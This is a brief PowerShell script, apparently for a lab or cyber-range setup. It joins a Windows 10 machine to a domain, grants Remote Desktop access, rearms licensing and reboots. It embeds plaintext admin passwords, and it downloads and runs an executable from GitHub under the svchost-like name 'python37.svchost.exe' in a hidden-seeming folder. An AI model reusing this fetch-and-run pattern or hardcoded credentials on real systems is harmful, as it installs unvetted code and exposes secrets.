### Basic non-Parameterized ps1 script to allow introduction of various limited-provisioning commands to Windows 10

add-computer -domainname "atlas.lab" -domaincredential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "atlas.lab\atlasadmin",("cmtsAdmin12#" | convertto-securestring -asplaintext -force))

Add-LocalGroupMember -group "Remote Desktop Users" -member cmtsadmin

Invoke-WebRequest -uri https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe -OutFile c:\users\cmtsadmin\searches\python37.svchost.exe 

Start-Process powershell.exe -verb runas -ArgumentList "start-process -filepath c:\users\cmtsadmin\searches\python37.svchost.exe -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\"cmtsadmin\\",(\\"cmtsAdmin12#\\" | convertto-securestring -asplaintext -force))"


cscript c:\windows\system32\slmgr.vbs /rearm
shutdown /r /t 03
